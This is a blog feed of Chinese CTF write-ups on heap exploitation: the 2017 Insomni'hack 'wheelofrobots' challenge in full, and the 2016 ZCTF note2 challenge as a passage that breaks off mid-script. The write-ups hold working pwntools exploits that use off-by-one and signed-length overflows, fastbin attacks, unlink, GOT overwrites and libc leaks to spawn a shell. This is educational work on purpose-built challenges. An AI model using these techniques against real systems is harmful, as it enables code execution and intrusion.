        <content type="html"><![CDATA[<p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2017_insomni'hack_wheelofrobots">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2017_insomni&#39;hack_wheelofrobots</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 ~/D/p/heap&gt; checksec wheelofrobots</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/heap/wheelofrobots&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>robots指针地址</p><p>0x6030e0- robot 4<br>0x6030e8- robot 6<br>0x6030f0- robot 2<br>0x6030f8- robot 1<br>0x603100- robot 3<br>0x603108- robot 5</p><p>大小</p><p>0x603138- robot 2<br>0x603140- robot 3<br>0x603148- robot 6</p><p>程序add()里num &#x3D; read_num((char *)&amp;choice, 5uLL);存在off by one漏洞，会覆盖掉robots 2的inuse位，一切的一切都从这里开始</p><h3 id="fastbin-attach任意长度堆溢出"><a href="#fastbin-attach任意长度堆溢出" class="headerlink" title="fastbin attach任意长度堆溢出"></a>fastbin attach任意长度堆溢出</h3><p>我们申请到robots2，大小控制到fastbin，0x20把，然后free掉这个chunk</p><p>这个时候fast bin0x20出现这个chunk指针，我们可以通过offbyone，重新使用这个堆，这个时候往这个chunk里面写入值，robots2+0x10已经不是原来的user data，而是fd指针，我们把他改为一个伪造的free chunk地址，申请0x20堆块的第二次，就可以申请到这个伪造chunk，那就可以实现地址读写，但是要绕过，fastbin 的size&#x3D;0x21检测，伪造的free chunk+0x8需要&#x3D;0x21，我们观察程序选择到0x603138，因为robots3，size是可控为0x21的，</p><p><img src="/2023/03/16/2017-insomn-hack-wheelofrobots/image-20230316234451675.png" alt="image-20230316234451675"></p><p>我们拿到0x603138这个chunk后，会往0x603138+0x10&#x3D;0x603148,即robot 6的size写入值，就可以实现任意大小堆溢出</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">overflow_benderinuse(<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">change(<span class="number">2</span>, p64(<span class="number">0x603138</span>))</span><br><span class="line">overflow_benderinuse(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">3</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">7</span>)</span><br><span class="line">change(<span class="number">1</span>,p64(<span class="number">0x80</span>))</span><br></pre></td></tr></table></figure><h3 id="构造unlink"><a href="#构造unlink" class="headerlink" title="构造unlink"></a>构造unlink</h3><p>常规构造,不多bb</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">target = <span class="number">0x6030E8</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(fd) + p64(bk) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0x30</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">0x40</span>) + p64(<span class="number">0xa0</span>)</span><br><span class="line">change(<span class="number">6</span>,payload)</span><br><span class="line">remove(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>0x6030E8，地址写入0x6030D0</p><h3 id="老办法"><a href="#老办法" class="headerlink" title="老办法"></a>老办法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">overflow_benderinuse(<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+ p64(free_got)+p64(puts_got)+p64(atoi_got)</span><br><span class="line">change(<span class="number">6</span>,payload)</span><br></pre></td></tr></table></figure><p><img src="/2023/03/16/2017-insomn-hack-wheelofrobots/image-20230317002742295.png" alt="image-20230317002742295"></p><p>2 6 1可用  puts free atoi</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">change(<span class="number">6</span>,p64(puts_plt))</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line">change(<span class="number">1</span>,p64(system))</span><br><span class="line">sla(<span class="string">b&#x27;oice : &#x27;</span>,<span class="string">b&#x27;sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="新办法"><a href="#新办法" class="headerlink" title="新办法"></a>新办法</h3><p>我们先</p><p>payload &#x3D; p64(0)*2 + b’a’*0x18 + p64(0x6030e8)<br>change(6,payload)</p><p>把1的指针指向6，这样就可以写一个通用函数去修改</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def write(where, what):</span><br><span class="line">    change(1, p64(where))</span><br><span class="line">    change(6, p64(what))</span><br></pre></td></tr></table></figure><p>我们去利用start_robot打印出地址，由于打印结束后会exit，我们需要先hook掉这个exitgot，改为leave ret或ret即可</p><p><img src="/2023/03/16/2017-insomn-hack-wheelofrobots/image-20230317005523642.png" alt="image-20230317005523642"></p><p>然后去修改got即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0x6030e8</span>)</span><br><span class="line">change(<span class="number">6</span>,payload)</span><br><span class="line">write(<span class="number">0x603130</span>, <span class="number">3</span>)</span><br><span class="line">leaveret=<span class="number">0x40172a</span></span><br><span class="line">ret=<span class="number">0x40172b</span></span><br><span class="line">write(elf.got[<span class="string">&#x27;exit&#x27;</span>], leaveret)</span><br><span class="line">change(<span class="number">1</span>,p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">sla(<span class="string">b&#x27;choice : &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;great!! Thx &#x27;</span>)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line"><span class="built_in">bin</span>=libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)+base</span><br><span class="line">write(elf.got[<span class="string">&#x27;free&#x27;</span>], system)</span><br><span class="line">change(<span class="number">1</span>,p64(<span class="built_in">bin</span>))</span><br><span class="line">remove(<span class="number">6</span>)</span><br></pre></td></tr></table></figure><p><img src="/2023/03/16/2017-insomn-hack-wheelofrobots/image-20230317003427076.png" alt="image-20230317003427076"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./wheelofrobots&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">offset_bin_main_arena</span>(<span class="params">idx</span>):</span><br><span class="line">    word_bytes = context.word_size / <span class="number">8</span></span><br><span class="line">    offset = <span class="number">4</span>  <span class="comment"># lock</span></span><br><span class="line">    offset += <span class="number">4</span>  <span class="comment"># flags</span></span><br><span class="line">    offset += word_bytes * <span class="number">10</span>  <span class="comment"># offset fastbin</span></span><br><span class="line">    offset += word_bytes * <span class="number">2</span>  <span class="comment"># top,last_remainder</span></span><br><span class="line">    offset += idx * <span class="number">2</span> * word_bytes  <span class="comment"># idx</span></span><br><span class="line">    offset -= word_bytes * <span class="number">2</span>  <span class="comment"># bin overlap</span></span><br><span class="line">    <span class="keyword">return</span> offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size=<span class="number">0</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">2</span>:</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;Increase Bender&#x27;s intelligence: &quot;</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">3</span>:</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;Increase Robot Devil&#x27;s cruelty: &quot;</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">6</span>:</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;Increase Destructor&#x27;s powerful: &quot;</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">idx, name</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Robot&#x27;s name: \n&quot;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_robot</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">overflow_benderinuse</span>(<span class="params">inuse</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;9999&#x27;</span> + inuse)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">where, what</span>):</span><br><span class="line">    change(<span class="number">1</span>, p64(where))</span><br><span class="line">    change(<span class="number">6</span>, p64(what))</span><br><span class="line"></span><br><span class="line"><span class="comment"># db(&#x27;b *0x004014B8&#x27;)#change 2</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x401314&#x27;)#remove 3</span></span><br><span class="line">db(<span class="string">&#x27;b *0x401725&#x27;</span>)<span class="comment">#exit</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">overflow_benderinuse(<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">change(<span class="number">2</span>, p64(<span class="number">0x603138</span>))</span><br><span class="line">overflow_benderinuse(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">3</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">7</span>)</span><br><span class="line">change(<span class="number">1</span>,p64(<span class="number">0x80</span>))</span><br><span class="line"></span><br><span class="line">target = <span class="number">0x6030E8</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(fd) + p64(bk) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0x30</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">0x40</span>) + p64(<span class="number">0xa0</span>)</span><br><span class="line">change(<span class="number">6</span>,payload)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># first way++++++++++++++++++++++++++</span></span><br><span class="line"><span class="comment"># overflow_benderinuse(b&#x27;\x01&#x27;)</span></span><br><span class="line"><span class="comment"># payload = p64(0)*3+ p64(free_got)+p64(puts_got)+p64(atoi_got)</span></span><br><span class="line"><span class="comment"># change(6,payload)</span></span><br><span class="line"><span class="comment"># change(6,p64(puts_plt))</span></span><br><span class="line"><span class="comment"># remove(2)</span></span><br><span class="line"><span class="comment"># puts_ad=u64(r(6).ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="comment"># p(&#x27;puts&#x27;,puts_ad)</span></span><br><span class="line"><span class="comment"># libc=LibcSearcher(&#x27;puts&#x27;,puts_ad)</span></span><br><span class="line"><span class="comment"># base=puts_ad-libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line"><span class="comment"># system=libc.dump(&#x27;system&#x27;)+base</span></span><br><span class="line"><span class="comment"># change(1,p64(system))</span></span><br><span class="line"><span class="comment"># sla(b&#x27;oice : &#x27;,b&#x27;sh\x00&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># second way+++++++++++++++++++</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0x6030e8</span>)</span><br><span class="line">change(<span class="number">6</span>,payload)</span><br><span class="line">write(<span class="number">0x603130</span>, <span class="number">3</span>)</span><br><span class="line">leaveret=<span class="number">0x40172a</span></span><br><span class="line">ret=<span class="number">0x40172b</span></span><br><span class="line">write(elf.got[<span class="string">&#x27;exit&#x27;</span>], leaveret)</span><br><span class="line">change(<span class="number">1</span>,p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">sla(<span class="string">b&#x27;choice : &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;great!! Thx &#x27;</span>)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line"><span class="built_in">bin</span>=libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)+base</span><br><span class="line">write(elf.got[<span class="string">&#x27;free&#x27;</span>], system)</span><br><span class="line">change(<span class="number">1</span>,p64(<span class="built_in">bin</span>))</span><br><span class="line">remove(<span class="number">6</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Unlink </tag>
            
            <tag> Fastbin Attach </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unlink 2016-ZCTF-note2-and-note3</title>
      <link href="/2023/03/15/2016-ZCTF-note2-and-note3/"/>
      <url>/2023/03/15/2016-ZCTF-note2-and-note3/</url>
      
        <content type="html"><![CDATA[<h2 id="2016-ZCTF-note2"><a href="#2016-ZCTF-note2" class="headerlink" title="2016-ZCTF-note2"></a>2016-ZCTF-note2</h2><p><a href="https://files.buuoj.cn/files/761fb16a644de97e745bb29b281c0fff/note2">https://files.buuoj.cn/files/761fb16a644de97e745bb29b281c0fff/note2</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16:~/Desktop/pwn/heap$ checksec note2</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/heap/note2&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>没开pie而且有指针全局数组再bss段，最多四个堆块，可通过数组里的指针编辑修改数据，优先考虑unlink</p><p>找找哪里有堆溢出不</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">ReadStr</span><span class="params">(<span class="type">char</span> *s, __int64 len, <span class="type">char</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+2Fh] [rbp-11h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">ssize_t</span> v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; len - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    s[i] = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  s[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自定义了一个输入函数，可惜忽略了signed数和unsigned数比较时signed会转变为unsigned数，我们malloc(0)时，len-1为-1,-1和unsigned i比较时会变为0xffffffff，可以堆溢出</p><p>malloc(0)时，glibc 的要求 chunk 块至少可以存储 4 个必要的字段 (prev_size,size,fd,bk)，所以会分配 0x20 的空间。</p><h2 id="伪造unlink-chunk"><a href="#伪造unlink-chunk" class="headerlink" title="伪造unlink chunk"></a>伪造unlink chunk</h2><p>content &#x3D; b’a’ * 8 + p64(0xa1) + p64(fakefd) + p64(fakebk) + b’b’ * 0x48<br>newnote(0x80, content)<br>newnote(0, ‘a’ * 8)<br>newnote(0x80, ‘b’ * 16)</p><p>在chunk0里伪造chunk，为了绕过&#x3D;P的检测我们</p><p>ptr &#x3D; 0x0000000000602120 这里存储的是伪造chunk的开始地址<br>fakefd &#x3D; ptr - 0x18<br>fakebk &#x3D; ptr - 0x10</p><p>这里我们不能直接在chunk1申请时进行溢出，因为那时候我们还没有申请到chunk2，溢出会到topchunk，</p><p>我们先删除在申请就可以，因为大小是fastbin，再申请还是那个堆</p><p>deletenote(1)<br>content &#x3D; b’a’ * 16 + p64(0xa0) + p64(0x90)<br>newnote(0,content)</p><p>这样我们就可以溢出chunk2</p><p>deletenote(2) unlink</p><p><img src="/2023/03/15/2016-ZCTF-note2-and-note3/image-20230315170826792.png" alt="image-20230315170826792"></p><p>和我们上一篇文章讨论的一样把ptr地址内容改为ptr-0x18</p><h2 id="leak-拿shell"><a href="#leak-拿shell" class="headerlink" title="leak 拿shell"></a>leak 拿shell</h2><p>修改chunk0把ptr[0]修改为atoi_got,直接show就可以泄露出来atoi地址</p><p>atoi_got &#x3D; elf.got[‘atoi’]<br>content &#x3D; b’a’ * 0x18 + p64(atoi_got)<br>editnote(0, 1, content)<br>shownote(0)</p><p><img src="/2023/03/15/2016-ZCTF-note2-and-note3/image-20230315171243972.png" alt="image-20230315171243972"></p><p>再利用edit改写其got为system，输入binsh拿shell即可</p><p>content &#x3D; p64(system)<br>editnote(0, 1, content)<br>ru(b’option—&gt;&gt;’)<br>sl(b’&#x2F;bin&#x2F;sh\x00’)</p><p><img src="/2023/03/15/2016-ZCTF-note2-and-note3/image-20230315164908151.png" alt="image-20230315164908151"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./note2&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;29970&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">newnote</span>(<span class="params">length, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(less than 128)&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;content:&#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shownote</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">editnote</span>(<span class="params"><span class="built_in">id</span>, choice, s</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;2.append]&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line">    io.sendline(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deletenote</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b* 0x400C65&#x27;)#new</span></span><br><span class="line"><span class="comment"># db(&#x27;b* 0x400CE4&#x27;)#delete</span></span><br><span class="line">db(<span class="string">&#x27;b *0x400F74&#x27;</span>)<span class="comment">#edit</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;address:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;grxer&#x27;</span>)</span><br><span class="line">ptr = <span class="number">0x0000000000602120</span></span><br><span class="line">fakefd = ptr - <span class="number">0x18</span></span><br><span class="line">fakebk = ptr - <span class="number">0x10</span></span><br><span class="line">content = <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0xa1</span>) + p64(fakefd) + p64(fakebk) + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x48</span></span><br><span class="line">newnote(<span class="number">0x80</span>, content)</span><br><span class="line">newnote(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>, <span class="string">&#x27;b&#x27;</span> * <span class="number">16</span>)</span><br><span class="line">deletenote(<span class="number">1</span>)</span><br><span class="line">content = <span class="string">b&#x27;a&#x27;</span> * <span class="number">16</span> 